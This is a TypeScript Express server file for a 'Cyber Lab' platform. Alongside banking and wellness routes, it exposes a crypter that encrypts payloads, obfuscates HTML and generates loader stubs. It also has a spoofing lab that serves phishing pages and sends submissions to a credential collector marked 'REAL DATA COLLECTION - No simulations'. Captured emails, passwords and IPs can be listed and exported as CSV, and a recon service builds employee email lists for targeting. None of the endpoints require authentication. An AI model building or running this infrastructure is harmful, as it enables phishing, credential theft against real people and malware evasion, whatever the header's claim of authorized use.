import express, { Request, Response } from "express";
import path from "path";
import { BotCyberLab, BotBanking } from "./services/cyberLabService";
import { botLearningService } from "./services/botLearningService";
import { storage } from "./services/storage";
import { attackLogService } from "./services/attackLogService";
import { guardianAngel } from "./services/guardianAngelService";
import { crypterService } from "./services/crypterService";
import { spoofingLab } from "./services/spoofingLabService";
import { reconService } from "./services/reconService";
import godbrainSecurityRoutes from "./godbrainSecurityRoutes";

const app = express();
const port = process.env.PORT || 3001;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, "../public")));

// ===== GODBRAIN INTEGRATED SECURITY PLATFORM =====
// Complete Offensive Security Suite for Authorized Engagements
app.use("/api/security", godbrainSecurityRoutes);

// Initialize bots
const cyberLab = new BotCyberLab();
const banking = new BotBanking();

// ===== CYBERLAB ENDPOINTS =====

app.post("/api/cyberlab/scan-contract", async (req: Request, res: Response) => {
  try {
    const { contractAddress, network } = req.body;
    const result = await cyberLab.scanContract(contractAddress, network);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to scan contract" });
  }
});

app.post("/api/cyberlab/penetration-test", async (req: Request, res: Response) => {
  try {
    const { targetUrl } = req.body;
    const result = await cyberLab.penetrationTest(targetUrl);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to run penetration test" });
  }
});

app.post("/api/cyberlab/simulate-attack", async (req: Request, res: Response) => {
  try {
    const { attackType, target } = req.body;
    const result = await cyberLab.simulateAttack(attackType, target);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to simulate attack" });
  }
});

app.post("/api/cyberlab/audit-wallet", async (req: Request, res: Response) => {
  try {
    const { walletAddress } = req.body;
    const result = await cyberLab.auditWallet(walletAddress);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to audit wallet" });
  }
});

app.post("/api/cyberlab/detect-phishing", async (req: Request, res: Response) => {
  try {
    const { url } = req.body;
    const result = await cyberLab.detectPhishing(url);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to detect phishing" });
  }
});

// ===== BANKING ENDPOINTS =====

app.post("/api/banking/link-account", async (req: Request, res: Response) => {
  try {
    const { userId, plaidToken } = req.body;
    const accountId = await banking.linkBankAccount(userId, plaidToken);
    res.json({ accountId });
  } catch (error) {
    res.status(500).json({ error: "Failed to link bank account" });
  }
});

app.get("/api/banking/balance/:accountId", async (req: Request, res: Response) => {
  try {
    const { accountId } = req.params;
    const balance = await banking.getBalance(accountId);
    res.json(balance);
  } catch (error) {
    res.status(500).json({ error: "Failed to get balance" });
  }
});

app.post("/api/banking/ach", async (req: Request, res: Response) => {
  try {
    const { accountId, amount, direction } = req.body;
    const achId = await banking.initiateACH({ accountId, amount, direction });
    res.json({ achId });
  } catch (error) {
    res.status(500).json({ error: "Failed to initiate ACH" });
  }
});

app.get("/api/banking/transactions/:accountId", async (req: Request, res: Response) => {
  try {
    const { accountId } = req.params;
    const days = parseInt(req.query.days as string) || 30;
    const transactions = await banking.getTransactions(accountId, days);
    res.json(transactions);
  } catch (error) {
    res.status(500).json({ error: "Failed to get transactions" });
  }
});

app.get("/api/banking/categorize/:accountId", async (req: Request, res: Response) => {
  try {
    const { accountId } = req.params;
    const result = await banking.categorizeTransactions(accountId);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to categorize transactions" });
  }
});

app.get("/api/banking/credit-score/:userId", async (req: Request, res: Response) => {
  try {
    const { userId } = req.params;
    const score = await banking.getCreditScore(userId);
    res.json({ score });
  } catch (error) {
    res.status(500).json({ error: "Failed to get credit score" });
  }
});

app.post("/api/banking/loan-qualification", async (req: Request, res: Response) => {
  try {
    const { userId, loanAmount } = req.body;
    const result = await banking.analyzeLoanQualification(userId, loanAmount);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to analyze loan qualification" });
  }
});

app.get("/api/banking/financial-health/:userId", async (req: Request, res: Response) => {
  try {
    const { userId } = req.params;
    const result = await banking.calculateFinancialHealth(userId);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to calculate financial health" });
  }
});

// ===== LEARNING ENDPOINTS =====

app.get("/api/learning/skills", async (req: Request, res: Response) => {
  try {
    const botId = req.query.botId as string;
    const skills = botLearningService.getSkills(botId);
    res.json(skills);
  } catch (error) {
    res.status(500).json({ error: "Failed to get skills" });
  }
});

app.get("/api/learning/executions", async (req: Request, res: Response) => {
  try {
    const botId = req.query.botId as string;
    const executions = botLearningService.getExecutions(botId);
    res.json(executions);
  } catch (error) {
    res.status(500).json({ error: "Failed to get executions" });
  }
});

app.get("/api/learning/memories", async (req: Request, res: Response) => {
  try {
    const botId = req.query.botId as string;
    const memories = botLearningService.getMemories(botId);
    res.json(memories);
  } catch (error) {
    res.status(500).json({ error: "Failed to get memories" });
  }
});

// ===== ATTACK LOG ENDPOINTS =====

app.get("/api/attacks/logs", async (req: Request, res: Response) => {
  try {
    const filters = {
      severity: req.query.severity as string,
      status: req.query.status as string,
      attackType: req.query.attackType as string,
      limit: req.query.limit ? parseInt(req.query.limit as string) : 100
    };
    const logs = attackLogService.getAttackLogs(filters);
    res.json(logs);
  } catch (error) {
    res.status(500).json({ error: "Failed to get attack logs" });
  }
});

app.get("/api/attacks/vulnerabilities", async (req: Request, res: Response) => {
  try {
    const filters = {
      target: req.query.target as string,
      targetType: req.query.targetType as string,
      minRiskScore: req.query.minRiskScore ? parseInt(req.query.minRiskScore as string) : undefined,
      limit: req.query.limit ? parseInt(req.query.limit as string) : 100
    };
    const reports = attackLogService.getVulnerabilityReports(filters);
    res.json(reports);
  } catch (error) {
    res.status(500).json({ error: "Failed to get vulnerability reports" });
  }
});

app.get("/api/attacks/threats", async (req: Request, res: Response) => {
  try {
    const filters = {
      threatType: req.query.threatType as string,
      minConfidence: req.query.minConfidence ? parseInt(req.query.minConfidence as string) : undefined,
      limit: req.query.limit ? parseInt(req.query.limit as string) : 100
    };
    const threats = attackLogService.getThreatIntelligence(filters);
    res.json(threats);
  } catch (error) {
    res.status(500).json({ error: "Failed to get threat intelligence" });
  }
});

app.get("/api/attacks/statistics", async (req: Request, res: Response) => {
  try {
    const stats = attackLogService.getStatistics();
    res.json(stats);
  } catch (error) {
    res.status(500).json({ error: "Failed to get statistics" });
  }
});

app.delete("/api/attacks/clear", async (req: Request, res: Response) => {
  try {
    const olderThan = req.query.olderThan ? new Date(req.query.olderThan as string) : undefined;
    const removed = attackLogService.clearLogs(olderThan);
    res.json({ message: `Cleared ${removed} logs`, removed });
  } catch (error) {
    res.status(500).json({ error: "Failed to clear logs" });
  }
});

// ===== GUARDIAN ANGEL ENDPOINTS =====

app.post("/api/guardian/health", async (req: Request, res: Response) => {
  try {
    const { userId, metrics } = req.body;
    const result = await guardianAngel.trackHealthMetrics(userId, metrics);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to track health metrics" });
  }
});

app.get("/api/guardian/wellness/:userId", async (req: Request, res: Response) => {
  try {
    const { userId } = req.params;
    const wellness = await guardianAngel.analyzeWellness(userId);
    res.json(wellness);
  } catch (error) {
    res.status(500).json({ error: "Failed to analyze wellness" });
  }
});

app.post("/api/guardian/schedule", async (req: Request, res: Response) => {
  try {
    const item = await guardianAngel.addScheduleItem(req.body);
    res.json(item);
  } catch (error) {
    res.status(500).json({ error: "Failed to add schedule item" });
  }
});

app.get("/api/guardian/schedule/:userId", async (req: Request, res: Response) => {
  try {
    const { userId } = req.params;
    const startDate = req.query.startDate ? new Date(req.query.startDate as string) : undefined;
    const endDate = req.query.endDate ? new Date(req.query.endDate as string) : undefined;
    const schedule = await guardianAngel.getSchedule(userId, startDate, endDate);
    res.json(schedule);
  } catch (error) {
    res.status(500).json({ error: "Failed to get schedule" });
  }
});

app.put("/api/guardian/schedule/:itemId/complete", async (req: Request, res: Response) => {
  try {
    const { itemId } = req.params;
    const completed = await guardianAngel.completeScheduleItem(itemId);
    res.json({ completed });
  } catch (error) {
    res.status(500).json({ error: "Failed to complete item" });
  }
});

app.post("/api/guardian/safety", async (req: Request, res: Response) => {
  try {
    const { userId, location } = req.body;
    const result = await guardianAngel.checkSafety(userId, location);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to check safety" });
  }
});

app.post("/api/guardian/sos", async (req: Request, res: Response) => {
  try {
    const { userId, location } = req.body;
    const result = await guardianAngel.sendSOS(userId, location);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to send SOS" });
  }
});

app.get("/api/guardian/briefing/:userId", async (req: Request, res: Response) => {
  try {
    const { userId } = req.params;
    const briefing = await guardianAngel.getDailyBriefing(userId);
    res.json(briefing);
  } catch (error) {
    res.status(500).json({ error: "Failed to get daily briefing" });
  }
});

app.get("/api/guardian/alerts", async (req: Request, res: Response) => {
  try {
    const filters: any = {};
    if (req.query.type) filters.type = req.query.type;
    if (req.query.priority) filters.priority = req.query.priority;
    if (req.query.acknowledged !== undefined) filters.acknowledged = req.query.acknowledged === 'true';

    const alerts = guardianAngel.getAlerts(filters);
    res.json(alerts);
  } catch (error) {
    res.status(500).json({ error: "Failed to get alerts" });
  }
});

app.put("/api/guardian/alerts/:alertId/acknowledge", async (req: Request, res: Response) => {
  try {
    const { alertId } = req.params;
    const acknowledged = guardianAngel.acknowledgeAlert(alertId);
    res.json({ acknowledged });
  } catch (error) {
    res.status(500).json({ error: "Failed to acknowledge alert" });
  }
});

app.get("/api/guardian/health-history", async (req: Request, res: Response) => {
  try {
    const days = req.query.days ? parseInt(req.query.days as string) : 30;
    const history = guardianAngel.getHealthHistory(days);
    res.json(history);
  } catch (error) {
    res.status(500).json({ error: "Failed to get health history" });
  }
});

// ===== CRYPTER ENDPOINTS =====

app.post("/api/crypter/encrypt", async (req: Request, res: Response) => {
  try {
    const { payload, type, options } = req.body;
    const result = await crypterService.encrypt(payload, type, options);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: "Failed to encrypt payload" });
  }
});

app.post("/api/crypter/decrypt", async (req: Request, res: Response) => {
  try {
    const { encrypted, method, key } = req.body;
    const decrypted = await crypterService.decrypt(encrypted, method, key);
    res.json({ decrypted });
  } catch (error) {
    res.status(500).json({ error: "Failed to decrypt payload" });
  }
});

app.post("/api/crypter/obfuscate-html", async (req: Request, res: Response) => {
  try {
    const { html, options } = req.body;
    const obfuscated = await crypterService.obfuscateHTML(html, options);
    res.json({ obfuscated });
  } catch (error) {
    res.status(500).json({ error: "Failed to obfuscate HTML" });
  }
});

app.post("/api/crypter/generate-stub", async (req: Request, res: Response) => {
  try {
    const { encryptedPayload, method, key } = req.body;
    const stub = await crypterService.generateStub(encryptedPayload, method, key);
    res.json({ stub });
  } catch (error) {
    res.status(500).json({ error: "Failed to generate stub" });
  }
});

// ===== SPOOFING LAB ENDPOINTS =====

app.get("/api/spoofing/templates", async (req: Request, res: Response) => {
  try {
    const filters: any = {};
    if (req.query.category) filters.category = req.query.category;
    if (req.query.difficulty) filters.difficulty = req.query.difficulty;

    const templates = await spoofingLab.getTemplates(filters);
    res.json(templates);
  } catch (error) {
    res.status(500).json({ error: "Failed to get templates" });
  }
});

app.get("/api/spoofing/templates/:id", async (req: Request, res: Response) => {
  try {
    const template = await spoofingLab.getTemplate(req.params.id);
    if (!template) {
      return res.status(404).json({ error: "Template not found" });
    }
    res.json(template);
  } catch (error) {
    res.status(500).json({ error: "Failed to get template" });
  }
});

app.post("/api/spoofing/templates", async (req: Request, res: Response) => {
  try {
    const template = await spoofingLab.createTemplate(req.body);
    res.json(template);
  } catch (error) {
    res.status(500).json({ error: "Failed to create template" });
  }
});

app.post("/api/spoofing/customize/:templateId", async (req: Request, res: Response) => {
  try {
    const { templateId } = req.params;
    const { customizations } = req.body;
    const customized = await spoofingLab.customizeTemplate(templateId, customizations);
    res.json({ customized });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to customize template", detail: error.message });
  }
});

app.get("/api/spoofing/campaigns", async (req: Request, res: Response) => {
  try {
    const filters: any = {};
    if (req.query.status) filters.status = req.query.status;
    if (req.query.createdBy) filters.createdBy = req.query.createdBy;

    const campaigns = await spoofingLab.getCampaigns(filters);
    res.json(campaigns);
  } catch (error) {
    res.status(500).json({ error: "Failed to get campaigns" });
  }
});

app.get("/api/spoofing/campaigns/:id", async (req: Request, res: Response) => {
  try {
    const campaign = await spoofingLab.getCampaign(req.params.id);
    if (!campaign) {
      return res.status(404).json({ error: "Campaign not found" });
    }
    res.json(campaign);
  } catch (error) {
    res.status(500).json({ error: "Failed to get campaign" });
  }
});

app.post("/api/spoofing/campaigns", async (req: Request, res: Response) => {
  try {
    const campaign = await spoofingLab.createCampaign(req.body);
    res.json(campaign);
  } catch (error: any) {
    res.status(500).json({ error: "Failed to create campaign", detail: error.message });
  }
});

app.post("/api/spoofing/campaigns/:id/stats", async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { stat } = req.body;
    await spoofingLab.updateCampaignStats(id, stat);
    res.json({ success: true });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to update campaign stats", detail: error.message });
  }
});

app.post("/api/spoofing/analyze", async (req: Request, res: Response) => {
  try {
    const analysis = await spoofingLab.analyzeSpoofing(req.body);
    res.json(analysis);
  } catch (error) {
    res.status(500).json({ error: "Failed to analyze spoofing" });
  }
});

app.get("/api/spoofing/campaigns/:id/report", async (req: Request, res: Response) => {
  try {
    const report = await spoofingLab.generateTrainingReport(req.params.id);
    res.json(report);
  } catch (error: any) {
    res.status(500).json({ error: "Failed to generate report", detail: error.message });
  }
});

// ===== SPOOFING LAB - CREDENTIAL COLLECTION (REAL DATA) =====

/**
 * POST /api/spoofing/collect
 * Collect credentials from phishing page submission
 * REAL DATA COLLECTION - No simulations
 */
app.post("/api/spoofing/collect", async (req: Request, res: Response) => {
  try {
    const { email, password, campaignId, attemptNumber } = req.body;
    const ipAddress = req.ip || req.socket.remoteAddress || "unknown";
    const userAgent = req.headers["user-agent"] || "unknown";

    const capture = await spoofingLab.collectCredentials({
      email,
      password,
      campaignId,
      attemptNumber,
      ipAddress,
      userAgent
    });

    res.json({
      success: true,
      captureId: capture.id,
      attemptNumber: capture.attemptNumber
    });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to collect credentials", detail: error.message });
  }
});

/**
 * GET /api/spoofing/page/:campaignId?email=user@example.com
 * Serve phishing page HTML for a campaign
 */
app.get("/api/spoofing/page/:campaignId", async (req: Request, res: Response) => {
  try {
    const { campaignId } = req.params;
    const email = (req.query.email as string) || "";

    const campaign = await spoofingLab.getCampaign(campaignId);
    if (!campaign) {
      return res.status(404).send("<h1>Campaign not found</h1>");
    }

    const html = await spoofingLab.customizeTemplate(campaign.templateId, {
      target_email: email,
      submit_url: "/api/spoofing/collect",
      campaign_id: campaignId
    });

    res.setHeader("Content-Type", "text/html");
    res.send(html);
  } catch (error: any) {
    res.status(500).send(`<h1>Error loading page</h1><p>${error.message}</p>`);
  }
});

/**
 * GET /api/spoofing/credentials?campaignId=xxx
 * Get captured credentials (filtered by campaign if provided)
 */
app.get("/api/spoofing/credentials", async (req: Request, res: Response) => {
  try {
    const campaignId = req.query.campaignId as string | undefined;
    const credentials = await spoofingLab.getCredentials(campaignId);
    res.json({ total: credentials.length, credentials });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to get credentials", detail: error.message });
  }
});

/**
 * GET /api/spoofing/credentials/stats/:campaignId
 * Get credential statistics for a campaign
 */
app.get("/api/spoofing/credentials/stats/:campaignId", async (req: Request, res: Response) => {
  try {
    const { campaignId } = req.params;
    const stats = await spoofingLab.getCredentialStats(campaignId);
    res.json(stats);
  } catch (error: any) {
    res.status(500).json({ error: "Failed to get credential stats", detail: error.message });
  }
});

/**
 * GET /api/spoofing/credentials/export?campaignId=xxx
 * Export credentials as CSV
 */
app.get("/api/spoofing/credentials/export", async (req: Request, res: Response) => {
  try {
    const campaignId = req.query.campaignId as string | undefined;
    const csv = await spoofingLab.exportCredentialsCSV(campaignId);

    res.setHeader("Content-Type", "text/csv");
    res.setHeader("Content-Disposition", `attachment; filename=credentials_${campaignId || 'all'}_${Date.now()}.csv`);
    res.send(csv);
  } catch (error: any) {
    res.status(500).json({ error: "Failed to export credentials", detail: error.message });
  }
});

/**
 * DELETE /api/spoofing/credentials/cleanup?days=30
 * Clear old credentials (default 30 days)
 */
app.delete("/api/spoofing/credentials/cleanup", async (req: Request, res: Response) => {
  try {
    const days = req.query.days ? parseInt(req.query.days as string) : 30;
    const removed = await spoofingLab.clearOldCredentials(days);
    res.json({ success: true, removed, message: `Cleared ${removed} credentials older than ${days} days` });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to cleanup credentials", detail: error.message });
  }
});

// ===== LEAD GENERATION ENDPOINTS =====

/**
 * POST /api/leads/campaigns/start
 * Start a new lead generation campaign
 */
app.post("/api/leads/campaigns/start", async (req: Request, res: Response) => {
  try {
    const { name, targetIndustries, targetStates, targetCities, keywords } = req.body;

    if (!name || !targetIndustries || !targetStates || !keywords) {
      return res.status(400).json({ error: "Missing required fields: name, targetIndustries, targetStates, keywords" });
    }

    const campaign = await reconService.startLeadCampaign({
      name,
      targetIndustries,
      targetStates,
      targetCities,
      keywords
    });

    res.json({ success: true, campaign });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to start campaign", detail: error.message });
  }
});

/**
 * GET /api/leads/campaigns
 * Get all campaigns
 */
app.get("/api/leads/campaigns", async (req: Request, res: Response) => {
  try {
    const campaigns = reconService.getCampaigns();
    res.json({ success: true, campaigns, count: campaigns.length });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to get campaigns", detail: error.message });
  }
});

/**
 * GET /api/leads/campaigns/:campaignId
 * Get specific campaign details
 */
app.get("/api/leads/campaigns/:campaignId", async (req: Request, res: Response) => {
  try {
    const { campaignId } = req.params;
    const campaign = reconService.getCampaign(campaignId);

    if (!campaign) {
      return res.status(404).json({ error: "Campaign not found" });
    }

    res.json({ success: true, campaign });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to get campaign", detail: error.message });
  }
});

/**
 * POST /api/leads/collect
 * Collect leads for a company
 */
app.post("/api/leads/collect", async (req: Request, res: Response) => {
  try {
    const { companyName, website, industry, location, campaignId } = req.body;

    if (!companyName) {
      return res.status(400).json({ error: "Missing required field: companyName" });
    }

    const lead = await reconService.collectLeads({
      companyName,
      website,
      industry,
      location,
      campaignId
    });

    res.json({ success: true, lead });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to collect leads", detail: error.message });
  }
});

/**
 * POST /api/leads/:leadId/verify
 * Verify all emails for a lead
 */
app.post("/api/leads/:leadId/verify", async (req: Request, res: Response) => {
  try {
    const { leadId } = req.params;
    const lead = await reconService.verifyLeadEmails(leadId);

    if (!lead) {
      return res.status(404).json({ error: "Lead not found" });
    }

    res.json({ success: true, lead });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to verify emails", detail: error.message });
  }
});

/**
 * POST /api/leads/:leadId/generate-employee-emails
 * Generate email patterns for employees
 */
app.post("/api/leads/:leadId/generate-employee-emails", async (req: Request, res: Response) => {
  try {
    const { leadId } = req.params;
    const { employees } = req.body;

    if (!employees || !Array.isArray(employees)) {
      return res.status(400).json({ error: "Missing required field: employees (array)" });
    }

    const lead = await reconService.generateEmployeeEmails({ leadId, employees });

    if (!lead) {
      return res.status(404).json({ error: "Lead not found or missing website" });
    }

    res.json({ success: true, lead });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to generate employee emails", detail: error.message });
  }
});

/**
 * GET /api/leads?minScore=50&verified=true&industry=tech
 * Get all leads with optional filters
 */
app.get("/api/leads", async (req: Request, res: Response) => {
  try {
    const { minScore, verified, industry } = req.query;

    const filters: any = {};
    if (minScore) filters.minScore = parseInt(minScore as string);
    if (verified !== undefined) filters.verified = verified === 'true';
    if (industry) filters.industry = industry as string;

    const leads = reconService.getLeads(filters);

    res.json({ success: true, leads, count: leads.length });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to get leads", detail: error.message });
  }
});

/**
 * GET /api/leads/:leadId/qualify
 * Qualify lead for outreach readiness
 */
app.get("/api/leads/:leadId/qualify", async (req: Request, res: Response) => {
  try {
    const { leadId } = req.params;
    const qualification = reconService.qualifyLead(leadId);

    if (!qualification) {
      return res.status(404).json({ error: "Lead not found" });
    }

    res.json({ success: true, ...qualification });
  } catch (error: any) {
    res.status(500).json({ error: "Failed to qualify lead", detail: error.message });
  }
});

/**
 * GET /api/leads/export?format=csv&leadIds=xxx,yyy
 * Export leads to CSV or JSON
 */
app.get("/api/leads/export", async (req: Request, res: Response) => {
  try {
    const { format, leadIds } = req.query;
    const exportFormat = (format as string) || 'csv';
    const leadIdArray = leadIds ? (leadIds as string).split(',') : undefined;

    const exportData = reconService.exportLeads(exportFormat as 'csv' | 'json', leadIdArray);

    if (exportFormat === 'csv') {
      res.setHeader("Content-Type", "text/csv");
      res.setHeader("Content-Disposition", `attachment; filename=leads_${Date.now()}.csv`);
    } else {
      res.setHeader("Content-Type", "application/json");
      res.setHeader("Content-Disposition", `attachment; filename=leads_${Date.now()}.json`);
    }

    res.send(exportData);
  } catch (error: any) {
    res.status(500).json({ error: "Failed to export leads", detail: error.message });
  }
});

// Start server
app.listen(port, () => {
  console.log(`[Server] Cyber Lab running on http://localhost:${port}`);
  console.log(`[Server] Environment: ${process.env.NODE_ENV}`);
});
